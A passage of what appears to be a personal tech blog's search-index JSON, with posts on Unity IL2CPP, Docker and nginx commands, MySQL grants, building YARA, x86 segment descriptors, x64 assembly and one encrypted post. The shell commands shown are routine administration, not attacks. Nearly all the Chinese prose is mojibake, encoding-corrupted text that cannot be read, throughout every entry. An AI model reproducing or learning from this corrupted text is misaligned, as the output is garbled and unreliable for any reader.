libil2cppï¼Œå®ƒæ˜¯ä½œä¸ºä¸€ä¸ªé™æ€åº“è¢«é“¾æ¥åˆ°æœ€ç»ˆçš„æ¸¸æˆå¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚è¿™ä¹ˆåšçš„ä¸€ä¸ªä¸»è¦çš„å¥½å¤„æ˜¯å¯ä»¥ä½¿å¾—æ•´ä¸ªIL2CPPæŠ€æœ¯æ˜¯ç®€å•å¹¶ä¸”æ˜¯å¯ç§»æ¤çš„ é€šè¿‡æŸ¥çœ‹ éš Unity æä¾›çš„ libil2cpp çš„å¤´æ–‡ä»¶ï¼Œå¯ä»¥æ‰¾åˆ°æœ‰å…³å¦‚ä½•ç»„ç»‡ libil2cpp ä»£ç çš„ä¸€äº›çº¿ç´¢ï¼ˆ Windows ä¸Šå¤´æ–‡ä»¶åœ¨Editor\\Data\\PlaybackEngines\\webglsupport\\BuildTools\\Libraries\\libil2cpp\\include ç›®å½•ä¸­ï¼ŒOSX ä¸Šçš„ Contents/Frameworks/il2cpp/libil2cpp ç›®å½•ï¼‰ã€‚ä¾‹å¦‚ï¼Œç”±il2cppäº§ç”Ÿçš„C++ä»£ç å’Œlibil2cppä¹‹é—´çš„æ¥å£APIï¼Œå­˜åœ¨äºcodegen/il2cpp-codegen.hè¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ è¿è¡Œæ—¶çš„ä¸€ä¸ªå…³é”®éƒ¨åˆ†æ˜¯åƒåœ¾æ”¶é›†å™¨ã€‚Unity 5ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨libgcåƒåœ¾æ”¶é›†å™¨ã€‚å®ƒæ˜¯ä¸€ä¸ªå…¸å‹çš„è´å§†åƒåœ¾æ”¶é›†å™¨ï¼ˆBoehm-Demers-Weiser garbage collectorï¼‰ã€‚ï¼ˆè¯‘æ³¨ï¼šç›¸å¯¹ä½¿ç”¨ä¿å®ˆåƒåœ¾å›æ”¶ç­–ç•¥ï¼‰ã€‚ç„¶è€Œæˆ‘ä»¬çš„libil2cppè¢«è®¾è®¡æˆå¯ä»¥æ–¹ä¾¿ä½¿ç”¨å…¶ä»–åƒåœ¾å›æ”¶å™¨ã€‚å› æ­¤æˆ‘ä»¬ç°åœ¨ä¹Ÿåœ¨ç ”ç©¶é›†æˆå¾®è½¯å¼€æºçš„åƒåœ¾å›æ”¶å™¨ï¼ˆMicrosoft GCï¼‰ã€‚å¯¹äºåƒåœ¾å›æ”¶å™¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬ä¼šåœ¨åç»­çš„ä¸€ç¯‡ä¸­ä¸“é—¨çš„è®¨è®ºï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚ IL2CPPæ²¡åšçš„äº‹æƒ…æ²¡æœ‰å°è¯•ç”¨ IL2CPP é‡å†™ C# æ ‡å‡†åº“ã€‚ å½“ä½ ä½¿ç”¨IL2CPPåç«¯æ„å»ºUnityé¡¹ç›®çš„æ—¶å€™ï¼Œæ‰€æœ‰åœ¨mscorlib.dllï¼ŒSystem.dllç­‰ä¸­çš„C#æ ‡å‡†åº“å’ŒåŸæ¥ä½¿ç”¨Monoç¼–è¯‘æ—¶å€™çš„ä¸€æ¨¡ä¸€æ ·ã€‚ æˆ‘ä»¬å¯ä»¥ä¾èµ–å¥å£®çš„ä¸”ä¹…ç»è€ƒéªŒçš„C#æ ‡å‡†åº“ï¼Œæ‰€ä»¥å½“å¤„ç†æœ‰å…³IL2CPPçš„bugçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè‚¯å®šçš„è¯´é—®é¢˜å‡ºåœ¨AOTç¼–è¯‘å™¨æˆ–è€…è¿è¡Œæ—¶åº“è¿™ä¸¤ä¸ªåœ°æ–¹è€Œä¸æ˜¯åœ¨å…¶ä»–åœ°æ–¹ã€‚","link":"/2020/08/26/il2cpp/1%20.%20%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3IL2CPP/"},{"title":"linux-docker","text":"dockerå¸¸ç”¨å‘½ä»¤ docker run åˆ é™¤dockerå®¹å™¨1. ```docker rm $(docker ps -a -q)```ä¸€æ¬¡åˆ é™¤æ‰€æœ‰åœæ­¢çš„å®¹å™¨ 2. ```docker rm &lt;CONTAINER ID|NAME&gt; &lt;CONTAINER ID|NAME&gt;``` åˆ é™¤å•ä¸ªæˆ–å¤šä¸ªå®¹å™¨ã€‚ å¯åŠ¨/åœæ­¢/è¿æ¥å®¹å™¨1. ```docker start &lt;CONTAINER ID|NAME&gt;``` å¯åŠ¨å®¹å™¨ 2. ```docker stop &lt;CONTAINER ID|NAME&gt;``` åœæ­¢å®¹å™¨ 3. ```docker attach &lt;CONTAINER ID|NAME&gt;``` é™„åŠ åˆ°å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨ docker .net coreç”Ÿæˆå½±åƒ docker build -t radarserver . ç”Ÿæˆå½±åƒ docker run -itd -p 5000:5000 imageid arg ç”Ÿæˆå®¹å™¨ docker commit -m=&quot;has update&quot; -a=&quot;zpt&quot; 5a76c9bb0d02 zpt/ubuntu:v2 å®¹å™¨æ›´æ–°é•œåƒ -m:æäº¤çš„æè¿°ä¿¡æ¯ -a:æŒ‡å®šé•œåƒä½œè€… 5a76c9bb0d02ï¼šå®¹å™¨ID runoob/ubuntu:v2:æŒ‡å®šè¦åˆ›å»ºçš„ç›®æ ‡é•œåƒå é€šè¿‡dockerfileåˆ›å»ºå½±åƒ 1. æ„å»ºdockerfileæ–‡ä»¶ å¯åŠ¨å¹¶è¿›å…¥å®¹å™¨å†…éƒ¨ æ˜ å°„å½“å‰æ–‡ä»¶å¤¹åˆ°å®¹å™¨çš„projcet ä¸­ 1docker run -it -v$(pwd):/project amd64/centos:7 /bin/bash å¯åŠ¨å¹¶è¿›å…¥å®¹å™¨å†…éƒ¨ æ˜ å°„å½“å‰æ–‡ä»¶å¤¹åˆ°å®¹å™¨çš„projcet ä¸­,å¹¶æ‰§è¡Œ shell 1docker run -it -v$(pwd):/project --rm amd64_rtshell_make /bin/bash -c &quot;cd /project; make all;&quot; docker é•œåƒå¯¼å‡ºå’Œå¯¼å…¥å¯¼å‡º1docker save ImageName &gt; fileName.tar å¯¼å…¥1docker load &lt; fileName.tar å‚è€ƒæ–‡ç« :Dockerfileæ–‡ä»¶è¯¦è§£","link":"/2020/11/23/linux/linux-docker/"},{"title":"linux_mysql","text":"åˆ›å»ºç”¨æˆ·CREATE USER â€˜usernameâ€™@â€™hostâ€™ IDENTIFIED BY â€˜passwordâ€™; åˆ›å»ºæ•°æ®åº“CREATE DATABASE databasename; æˆæƒGRANT all privileges ON databasename.tablename TO â€˜usernameâ€™@â€™hostâ€™; ä¿¡æ¯åŒæ­¥åˆ°å†…å­˜flush privileges; å‚è€ƒæ–‡ç« :å‚è€ƒé“¾æ¥","link":"/2020/11/13/linux/linux-mysql/"},{"title":"linux-nginx","text":"centos8 nginxå®‰è£… ä¸‹è½½nginx å®˜ç½‘ï¼šhttp://nginx.org/ åˆ›å»ºæ–‡ä»¶å¤¹ mkdir nginx å¤åˆ¶å‹ç¼©åŒ…åœ°å€ wget http://nginx.org/download/nginx-1.17.6.tar.gzä¸‹è½½æ–‡ä»¶ wgetä¸å­˜åœ¨ yumå®‰è£…wget yum -y install wget å®‰è£…å¿…è¦æ’ä»¶ yum -y install automake autoconf libtool make yum -y install gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel å‹ç¼©ä¸‹è½½å¥½çš„æ–‡ä»¶ tar -zxvf nginx-1.17.6.tar.gz cd nginx-1.17.6 æŒ‡å®šå®‰è£…è·¯å¾„ ./configure --prefix=/software/nginx --with-http_stub_status_module --with-http_ssl_module makeç¼–è¯‘ make installå®‰è£… è¿›å…¥åˆ°å®‰è£…nginxç›®å½•ä¸‹é¢çš„sbin cd /software/nginx/sbin å¯åŠ¨å‘½ä»¤ ./nginx å¸¸ç”¨å‘½ä»¤ ä»å®¹åœæ­¢æœåŠ¡å™¨ nginx -s quit ç«‹å³åœæ­¢æœåŠ¡å™¨ nginx -s stop æŸ¥è¯¢nginxä¸»è¿›ç¨‹å· ps -ef | grep nginx ä»å®¹åœæ­¢ kill -QUIT ä¸»è¿›ç¨‹å· å¿«é€Ÿåœæ­¢ kill -TERM ä¸»è¿›ç¨‹å· å¼ºåˆ¶åœæ­¢ kill -9 nginx å¯åŠ¨ ./nginx é‡å¯ ./nginx -s reload å‚è€ƒæ–‡ç« :Nginx | CentOS 8 å®‰è£…Nginxè¯¦ç»†æ•™ç¨‹","link":"/2020/11/23/linux/linux-nginx/"},{"title":"linux-å‘½ä»¤","text":"æŸ¥çœ‹ç«¯å£å ç”¨1netstat -nap|grep 8000 ç»ˆæ­¢è¿›ç¨‹1kill -9 pid åå°è¿è¡Œ1nohup ./linux &gt; myout.file 2&gt;&amp;1 &amp;","link":"/2021/04/07/linux/linux-%E5%91%BD%E4%BB%A4/"},{"title":"linuxä¸‹ç¼–è¯‘yara","text":"bash: ./build.sh: /bin/sh^M: bad interpreter: No such file or directory q:æ‰§è¡Œ.shè„šæœ¬æ—¶ï¼ŒæŠ¥é”™ â€œstart.sh /bin/bash^M: åçš„è§£é‡Šå™¨ï¼šæ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•â€,å› ä¸º .shæ–‡ä»¶æ˜¯ä»windowsæ‹·è´è¿‡æ¥çš„ï¼Œæ‰€ä»¥å¤šäº†\\rï¼Œæ‰§è¡Œå‘½ä»¤ï¼ŒæŠŠæ–‡ä»¶ä¸­çš„\\r æ›¿æ¢æˆç©ºç™½ sed -i 's/\\r$//' build.sh å‚è€ƒé“¾æ¥ error: AC_CONFIG_MACRO_DIRS([m4]) conflicts with ACLOCAL_AMFLAGS=-. m4 1234apt-get install dos2unix dos2unix *.shdos2unix *.am å†²çªåŸå› ï¼Œåœ¨windowsä¸‹è½½ï¼Œåœ¨linuxä¸Šä½¿ç”¨ï¼Œè¡Œç»“å°¾æ ‡å¿—ä¸ä¸€æ ·ï¼Œéœ€è¦ä½¿ç”¨dos2unixè½¬æ¢ä¸€ä¸‹å³å¯","link":"/2021/04/07/linux/linux%E4%B8%8B%E7%BC%96%E8%AF%91yara/"},{"title":"ä¿æŠ¤æ¨¡å¼ - 1.CPUå°è¯•","text":"CPU æ¶æ„ Riscæ¶æ„ æ‰‹æœº åµŒå…¥å¼ ä¼˜ç‚¹ï¼šå°‘è€—ç”µï¼Œä½¿ç”¨çš„æ—¶é—´æ›´é•¿ æŒ‡ä»¤é›†ï¼šå®šé•¿ armå±äºæ­¤æ¶æ„ Ciscæ¶æ„ U V I ä½åŠŸè€—çœç”µ æŒ‡ä»¤é›†ï¼šå˜é•¿ mov eax,dword ptr ds:[0x12345678] æ‰§è¡Œæµç¨‹ï¼š I5 ï¼š é¢„å– ï¼šå–æŒ‡é’ˆ è¯‘ç 1 ï¼šè·å–åŸæ“ä½œæ•° ï¼ˆæŒ‡ä»¤ï¼‰ è¯‘ç 2 ï¼šè®¡ç®—åœ°å€æˆ–è€…å¯„å­˜å™¨ æ‰§è¡Œ ï¼šå‘é€CPUæ‰§è¡Œ å›å†™ ï¼šæ‰§è¡Œå®Œå›å†™ I7+ : é¢„å– ï¼šå–æŒ‡é’ˆ è¯‘ç 1 ï¼šè·å–åŸæ“ä½œæ•° ï¼ˆæŒ‡ä»¤ï¼‰ å–ç›®æ ‡æ•° è¯‘ç 2 ï¼šè®¡ç®—åœ°å€æˆ–è€…å¯„å­˜å™¨ æ‰§è¡Œ ï¼šå‘é€CPUæ‰§è¡Œ å›å†™ ï¼šæ‰§è¡Œå®Œå›å†™ æ”¯æŒå¤šçº§æµæ°´çº¿ è¿™ç§CPUå†…éƒ¨ååŒå·¥ä½œ å«åšè¶…çº§çº¿ç¨‹ CPUï¼šé¢„è®¡ç®— ä¸å½±å“ç»“æœçš„å‰æ å»æ‰§è¡Œ,å¦‚ä¸‹ VSå¹¶è¡Œæ‰§è¡Œ 12xor eax,eaxxor ecx,ecx é€»è¾‘åœ°å€+gtd.ds.base = çº¿æ€§åœ°å€ çº¿æ€§åœ°å€æ‹†æˆç‰©ç†åœ°å€","link":"/2021/04/18/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/1.CPU%E5%B0%9D%E8%AF%95/"},{"title":"ä¿æŠ¤æ¨¡å¼ - 2.æ®µæè¿°ç¬¦","text":"æ®µæè¿°ç¬¦ Sä½ï¼šç”¨äºæŒ‡å®šè¿°ç¬¦çš„ç±»å‹ï¼ˆDescriptor Typeï¼‰ã€‚å½“è¯¥ä½æ˜¯â€œ0â€æ—¶ï¼Œè¡¨ç¤ºæ˜¯ä¸€ä¸ªç³»ç»Ÿæ®µï¼›ä¸ºâ€œ1â€ æ—¶ï¼Œè¡¨ç¤ºæ˜¯ä¸€ä¸ªä»£ç æ®µæˆ–è€…æ•°æ®æ®µï¼ˆå †æ ˆæ®µä¹Ÿæ˜¯ç‰¹æ®Šçš„æ•°æ®æ®µï¼‰ DPLï¼šè¡¨ç¤ºè¿°ç¬¦çš„ç‰¹æƒçº§ï¼ˆDescriptor Privilege Levelï¼ŒDPLï¼‰ã€‚è¿™ä¸¤ä½ç”¨äºæŒ‡å®šæ®µçš„ç‰¹æƒçº§ã€‚å…± æœ‰ 4 ç§å¤„ç†å™¨æ”¯æŒçš„ç‰¹æƒçº§åˆ«ï¼Œåˆ†åˆ«æ˜¯ 0ã€1ã€2ã€3ï¼Œå…¶ä¸­ 0 æ˜¯æœ€é«˜ç‰¹æƒçº§åˆ«ï¼Œ3 æ˜¯æœ€ä½ç‰¹æƒçº§åˆ«ã€‚ åˆšè¿›å…¥ä¿æŠ¤æ¨¡å¼æ—¶æ‰§è¡Œçš„ä»£ç å…·æœ‰æœ€é«˜ç‰¹æƒçº§ 0ï¼ˆå¯ä»¥çœ‹æˆæ˜¯ä»å¤„ç†å™¨é‚£é‡Œç»§æ‰¿æ¥çš„ï¼‰ï¼Œè¿™äº›ä»£ç é€š å¸¸éƒ½æ˜¯æ“ä½œç³»ç»Ÿä»£ç ï¼Œå› æ­¤å®ƒçš„ç‰¹æƒçº§åˆ«æœ€é«˜ã€‚æ¯å½“æ“ä½œç³»ç»ŸåŠ è½½ä¸€ä¸ªç”¨æˆ·ç¨‹åºæ—¶ï¼Œå®ƒé€šå¸¸éƒ½ä¼šæŒ‡ å®šä¸€ä¸ªç¨ä½çš„ç‰¹æƒçº§ï¼Œæ¯”å¦‚ 3 ç‰¹æƒçº§ã€‚ä¸åŒç‰¹æƒçº§åˆ«çš„ç¨‹åºæ˜¯äº’ç›¸éš”ç¦»çš„ï¼Œå…¶äº’è®¿æ˜¯ä¸¥æ ¼é™åˆ¶çš„ï¼Œ è€Œä¸”æœ‰äº›å¤„ç†å™¨æŒ‡ä»¤ï¼ˆç‰¹æƒæŒ‡ä»¤ï¼‰åªèƒ½ç”± 0 ç‰¹æƒçº§çš„ç¨‹åºæ¥æ‰§è¡Œï¼Œä¸ºçš„å°±æ˜¯å®‰å…¨ Gä½æ˜¯ç²’åº¦ï¼ˆGranularityï¼‰ä½ï¼Œç”¨äºè§£é‡Šæ®µç•Œé™çš„å«ä¹‰ã€‚å½“ G ä½æ˜¯â€œ0â€æ—¶ï¼Œæ®µç•Œé™ä»¥å­—èŠ‚ä¸º å•ä½ã€‚æ­¤æ—¶ï¼Œæ®µçš„æ‰©å±•èŒƒå›´æ˜¯ä» 1 å­—èŠ‚åˆ° 1 å…†å­—èŠ‚ï¼ˆ1Bï½1MBï¼‰ï¼Œ å›  ä¸º è¿° ç¬¦ ä¸­ çš„ ç•Œ é™ å€¼ æ˜¯ 20 ä½ çš„ã€‚ç›¸åï¼Œå¦‚æœè¯¥ä½æ˜¯â€œ1â€ï¼Œ é‚£ ä¹ˆ ï¼Œ æ®µ ç•Œ é™ æ˜¯ ä»¥ 4KB ä¸ºå•ä½çš„ã€‚è¿™æ ·ï¼Œæ®µçš„æ‰©å±•èŒƒå›´æ˜¯ä» 4KB åˆ° 4GBã€‚ Pä½ æ®µæ˜¯å¦æœ‰æ•ˆ 1æœ‰æ•ˆ 0æ— æ•ˆ D/B ä½æ˜¯â€œé»˜è®¤çš„æ“ä½œæ•°å¤§å°â€ï¼ˆDefault Operation Sizeï¼‰æˆ–è€…â€œé»˜è®¤çš„å †æ ˆæŒ‡é’ˆå¤§å°â€ï¼ˆDefault Stack Pointer Sizeï¼‰ï¼Œåˆæˆ–è€…â€œä¸Šéƒ¨è¾¹ç•Œâ€ï¼ˆUpper Boundï¼‰æ ‡å¿—ï¼Œä¸»è¦ä¸ºäº†èƒ½å¤Ÿåœ¨32ä½å¤„ç†å™¨ä¸Šå…¼å®¹è¿è¡Œ16ä½ä¿æŠ¤æ¨¡å¼çš„ç¨‹åº Dï¼šä»£ç æ®µ ç”¨äºæŒ‡ç¤ºæŒ‡ä»¤ä¸­é»˜è®¤çš„ åç§»åœ°å€å’Œæ“ä½œæ•°å°ºå¯¸ã€‚Dï¼0 è¡¨ç¤ºæŒ‡ä»¤ä¸­çš„åç§»åœ°å€æˆ–è€…æ“ä½œæ•°æ˜¯ 16 ä½çš„ï¼›D=1ï¼ŒæŒ‡ç¤º 32 ä½çš„ åç§»åœ°å€æˆ–è€…æ“ä½œæ•° Bï¼šå †æ ˆæ®µ ç”¨äºåœ¨è¿›è¡Œéšå¼çš„å †æ ˆæ“ä½œæ—¶ï¼Œæ˜¯ä½¿ç”¨ SP å¯„å­˜å™¨è¿˜æ˜¯ ESP å¯„å­˜å™¨ã€‚éšå¼çš„å †æ ˆæ“ä½œæŒ‡ä»¤åŒ…æ‹¬ pushã€pop å’Œ call ç­‰ã€‚å¦‚æœè¯¥ä½æ˜¯â€œ0â€ï¼Œåœ¨è®¿é—®é‚£ä¸ªæ®µæ—¶ï¼Œ ä½¿ç”¨ SP å¯„å­˜å™¨ï¼Œå¦åˆ™å°±æ˜¯ä½¿ç”¨ ESP å¯„å­˜å™¨ã€‚åŒæ—¶ï¼ŒB ä½çš„å€¼ä¹Ÿå†³å®šäº†å †æ ˆçš„ä¸Šéƒ¨è¾¹ç•Œã€‚å¦‚æœ Bï¼0ï¼Œ é‚£ä¹ˆå †æ ˆæ®µçš„ä¸Šéƒ¨è¾¹ç•Œï¼ˆä¹Ÿå°±æ˜¯ SP å¯„å­˜å™¨çš„æœ€å¤§å€¼ï¼‰ä¸º 0xFFFFï¼›å¦‚æœ Bï¼1ï¼Œé‚£ä¹ˆå †æ ˆæ®µçš„ä¸Šéƒ¨ è¾¹ç•Œï¼ˆä¹Ÿå°±æ˜¯ ESP å¯„å­˜å™¨çš„æœ€å¤§å€¼ï¼‰ä¸º 0xFFFFFFFFã€‚ B=0 G=1 å‘ä¸Šæ‹“å±• åœ¨æ™®é€šæ•°æ®æ®µï¼ˆES,DS,FS,GSï¼‰ B=0 æ˜¯æ— æ•ˆçš„ TYPE å­—æ®µå…± 4 ä½ï¼Œç”¨äºæŒ‡ç¤ºè¿°ç¬¦çš„å­ç±»å‹ï¼Œæˆ–è€…è¯´æ˜¯ç±»åˆ«ã€‚ å¯¹äºæ•°æ®æ®µæ¥ è¯´ï¼Œè¿™ 4 ä½åˆ†åˆ«æ˜¯ Xã€Eã€Wã€A ä½ï¼› X E W A æè¿°ç¬¦ç±»åˆ« å«ä¹‰ 0 0 0 X æ•°æ® åªè¯» 0 0 1 X æ•°æ® è¯»ï¼Œå†™ 0 1 0 X æ•°æ® åªè¯»ï¼Œå‘ä¸‹æ‰©å±• 0 0 0 X æ•°æ® è¯»ï¼Œå†™ï¼Œå‘ä¸‹æ‰©å±• å¯¹äºä»£ç æ®µæ¥è¯´ï¼Œè¿™ 4 ä½åˆ™åˆ†åˆ«æ˜¯ Xã€Cã€Rã€A ä½; X C R A æè¿°ç¬¦ç±»åˆ« å«ä¹‰ 1 0 0 X ä»£ç  åªæ‰§è¡Œ 1 0 1 X ä»£ç  æ‰§è¡Œï¼Œè¯» 1 1 0 X ä»£ç  åªæ‰§è¡Œï¼Œä¾ä»çš„ä»£ç æ®µ 1 1 1 X ä»£ç  æ‰§è¡Œï¼Œè¯»ï¼Œä¾ä»çš„ä»£ç æ®µ X è¡¨ç¤ºæ˜¯å¦å¯ä»¥æ‰§è¡Œï¼ˆeXecutableï¼‰ã€‚æ•°æ®æ®µæ€»æ˜¯ä¸å¯æ‰§è¡Œçš„ï¼ŒXï¼0ï¼›ä»£ç æ®µæ€»æ˜¯ å¯ä»¥æ‰§è¡Œçš„ï¼Œå› æ­¤ï¼ŒXï¼1 A æ•°æ®æ®µå’Œä»£ç æ®µçš„ A ä½æ˜¯å·²è®¿é—®ï¼ˆAccessedï¼‰ä½ï¼Œç”¨äºæŒ‡ç¤ºå®ƒæ‰€æŒ‡å‘çš„æ®µæœ€è¿‘æ˜¯å¦è¢«è®¿é—®è¿‡ã€‚ åœ¨è¿°ç¬¦åˆ›å»ºçš„æ—¶å€™ï¼Œåº”è¯¥æ¸…é›¶ã€‚ä¹‹åï¼Œæ¯å½“è¯¥æ®µè¢«è®¿é—®æ—¶ï¼Œå¤„ç†å™¨è‡ªåŠ¨å°†è¯¥ä½ç½®â€œ1â€ã€‚å¯¹è¯¥ä½çš„ æ¸…é›¶æ˜¯ç”±è½¯ä»¶ï¼ˆæ“ä½œç³»ç»Ÿï¼‰è´Ÿè´£çš„ï¼Œé€šè¿‡å®šæœŸç›‘è§†è¯¥ä½çš„çŠ¶æ€ï¼Œå°±å¯ä»¥ç»Ÿè®¡å‡ºè¯¥æ®µçš„ä½¿ç”¨é¢‘ç‡ã€‚å½“ å†…å­˜ç©ºé—´ç´§å¼ æ—¶ï¼Œå¯ä»¥æŠŠä¸ç»å¸¸ä½¿ç”¨çš„æ®µé€€é¿åˆ°ç¡¬ç›˜ä¸Šï¼Œä»è€Œå®ç°è™šæ‹Ÿå†…å­˜ç®¡ç†ã€‚ å¯¹äºæ•°æ®æ®µæ¥è¯´ E ä½æŒ‡ç¤ºæ®µçš„æ‰©å±•æ–¹å‘ã€‚Eï¼0 æ˜¯å‘ä¸Šæ‰©å±•çš„ï¼Œä¹Ÿå°±æ˜¯å‘é«˜åœ°å€æ–¹å‘æ‰©å±•çš„ï¼Œä¸åŒ…å«limitï¼Œ æ˜¯æ™®é€šçš„æ•°æ®æ®µï¼›Eï¼1 æ˜¯å‘ä¸‹æ‰©å±•çš„ï¼Œä¹Ÿå°±æ˜¯å‘ä½åœ°å€æ–¹å‘æ‰©å±•çš„ï¼ŒåŒ…å«limitï¼Œé€šå¸¸æ˜¯å †æ ˆæ®µ W ä½æŒ‡ç¤ºæ®µ çš„è¯»å†™å±æ€§ï¼Œæˆ–è€…è¯´æ®µæ˜¯å¦å¯å†™ï¼ŒWï¼0 çš„æ®µæ˜¯ä¸å…è®¸å†™å…¥çš„ï¼Œå¦åˆ™ä¼šå¼•å‘å¤„ç†å™¨å¼‚å¸¸ä¸­æ–­ï¼›Wï¼1 çš„æ®µæ˜¯å¯ä»¥æ­£å¸¸å†™å…¥çš„ å¯¹äºä»£ç æ®µæ¥è¯´ C ä½æŒ‡ç¤ºæ®µæ˜¯å¦ä¸ºç‰¹æƒçº§ä¾ä»çš„ï¼ˆConformingï¼‰ã€‚ Cï¼0 è¡¨ç¤ºéä¾ä»çš„ä»£ç æ®µï¼Œ è¿™æ ·çš„ä»£ç æ®µå¯ä»¥ä»ä¸å®ƒç‰¹æƒçº§ç›¸åŒçš„ä»£ç æ®µè°ƒç”¨ï¼Œæˆ–è€…é€šè¿‡é—¨è°ƒç”¨ï¼›Cï¼1 è¡¨ç¤ºå…è®¸ä»ä½ç‰¹æƒçº§çš„ ç¨‹åºè½¬ç§»åˆ°è¯¥æ®µæ‰§è¡Œã€‚ R ä½æŒ‡ç¤ºä»£ç æ®µæ˜¯å¦å…è®¸ è¯»å‡ºã€‚ä»£ç æ®µæ€»æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œä½†æ˜¯ï¼Œä¸ºäº†é˜²æ­¢ç¨‹åºè¢«ç ´åï¼Œå®ƒæ˜¯ä¸èƒ½å†™å…¥çš„ã€‚è‡³äºæ˜¯å¦æœ‰è¯»å‡ºçš„å¯ èƒ½ï¼Œç”± R ä½æŒ‡å®šã€‚Rï¼0 è¡¨ç¤ºä¸èƒ½è¯»å‡ºï¼Œå¦‚æœä¼å›¾å»è¯»ä¸€ä¸ª Rï¼0 çš„ä»£ç æ®µï¼Œä¼šå¼•å‘å¤„ç†å™¨å¼‚å¸¸ä¸­æ–­ï¼› å¦‚æœ Rï¼1ï¼Œåˆ™ä»£ç æ®µæ˜¯å¯ä»¥è¯»å‡ºçš„ï¼Œå³å¯ä»¥æŠŠè¿™ä¸ªæ®µçš„å†…å®¹å½“æˆ ROM ä¸€æ ·ä½¿ç”¨ã€‚ ç æ®µæ˜¯ä¸å¯è¯»çš„ï¼Œé‚£å¤„ç†å™¨æ€ä¹ˆä»é‡Œé¢å–æŒ‡ä»¤æ‰§è¡Œå‘¢ï¼Ÿäº‹å®ä¸Šï¼Œè¿™é‡Œçš„ R å±æ€§å¹¶éç”¨æ¥é™åˆ¶å¤„ç†å™¨ï¼Œè€Œæ˜¯ç”¨æ¥é™åˆ¶ç¨‹åºå’ŒæŒ‡ä»¤çš„è¡Œä¸ºã€‚ä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ˜¯ä½¿ç”¨æ®µè¶…è¶Šå‰ç¼€ â€œCS:â€æ¥è®¿é—®ä»£ç æ®µä¸­çš„å†…å®¹","link":"/2021/04/18/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/2.%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 1(æ±‡ç¼–)","text":"è¦ç‚¹ åœ¨x64ä¸­å¯¹32ä½çš„å¯„å­˜å™¨ï¼ˆæ¯”å¦‚eax,ebxï¼‰æ“ä½œçš„æ—¶å€™ï¼ˆxor and mov ç­‰ï¼‰ä¼šå½±å“64ä½çš„å¯„å­˜å™¨ ã€‚åœ¨x64ä¸­ mov eax,0x1 å’Œ mov rax,0x1 ä¿©ä¸ªæ±‡ç¼–çš„ç›¸ç­‰çš„ â€”é›¶æ‹“å±• x64å¯»å€å’Œx32å¯»å€ä¸ä¸€æ · call offset =call goto address - rip x64ä¸­ æ²¡æœ‰pushad pushaq æœ‰ pushfqï¼ˆeflagsï¼‰; push cs, push ds ä¹Ÿæ²¡æœ‰äº† vs x64é¡¹ç›®ä½¿ç”¨æ±‡ç¼–é…ç½®ï¼š å³é”®é¡¹ç›® -&gt; ç”Ÿæˆä¾èµ–é¡¹ -&gt; ç”Ÿæˆè‡ªå®šä¹‰ -&gt; é€‰ä¸­masm -&gt; ç¡®å®š å³é”®.asm å±æ€§ -&gt; é¡¹ç±»å‹é€‰æ‹© Microsoft Macro Assembler .asmæ–‡ä»¶ â€œ;â€åœ¨.asm ä¸­ æ˜¯æ³¨é‡Š åœ¨asmä¸­ 16è¿›åˆ¶ä¸èƒ½ä½¿ç”¨0x12345678 éœ€è¦ä½¿ç”¨ 12345678h æ³¨æ„å‡½æ•°åå’Œæ±‡ç¼–æŒ‡ä»¤å†²çª å‡½æ•°åè¦åŠ ä¸Šextern_c ç”¨cçš„è§„åˆ™æ¥ç”Ÿæˆå‡½æ•° 12345678.code ; åœ¨ä»£ç æ®µMySub proto; å¯¼å…¥ä»£ç ä¸­çš„å‡½æ•°funcName proc; funcName å‡½æ•°å mov rax,rcx add rax,rdx retfuncName endp;å‡½æ•°ç»“æŸend; å…¶ä»–C++é»˜è®¤å¯¼å‡ºå‡½æ•° ä¼šæœ‰è¿”å›å€¼å’Œå‚æ•°çš„åç¼€","link":"/2021/07/10/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1(%E6%B1%87%E7%BC%96)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 10(å¼‚å¸¸1)","text":"å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼ 289f71be50683e8477adef2014d66fe922e80b0f537543098ab1d2ac817bd030ff0f44a33e55a94a4d9444bbec69dfc3fe5c0b12fcacfcefd782b31c75be1b7c651dae9f000c949ff841a14007d223337fdd53babf3688d6e86639c4940cecf43ee3f45422b6c0c36cb285b26b741a50842d285f3147cf36ab1de8ccfab819cea067445723a0c8b9e2c064140a0181313e4bdb2f34ff69b7cf179460b097aa6c16726d6d6d3550cc5c14e58895f09371e3b2dd4e58739fec59b52b4d02b81805809dac285e32474abccfc01bdf75d8d981e1fdce89bada0536048efe6ccc911c92435ca3e359456d6336ad4e9ac938ad99cf0b88f3c26b97a85c44e4a0b62179703d08b77f46eaf2d5391895383624e5f2b98ba5fe0201bd32998d6bf11eb1eb3c21b3d781bccf29dd5b2ddb667602c544f6c9e0c946b0441a858d94413aeca3f5e7110c0b78a9220c6db01d6ac5e12b32648821ebf74ee4fdb669f5317e31742bb54de77bebd46b1a195e6121a30d1a180125ff5296f95b2eec9f300e28cb17186319aa9e56df9d407d1d4c791fc8ee00b2a16b6ad654293062eacd78213235610e718c87ea31b149875e3686d6a8eda057c9d0cc48c8fed3765e0e1b111e781b598964ada0ae794f2ca08fcc78d0c25b0fc3c89c52537c19fdf08adb523f0ba33e90803f7e66ec05c6090f0ceafcbb8a78c11f6811ef467921c73daf35b55f1fb9d3fce2c0a96684b51b04b6fa3b0238389c662e97a47d3eef5d7ccd7f712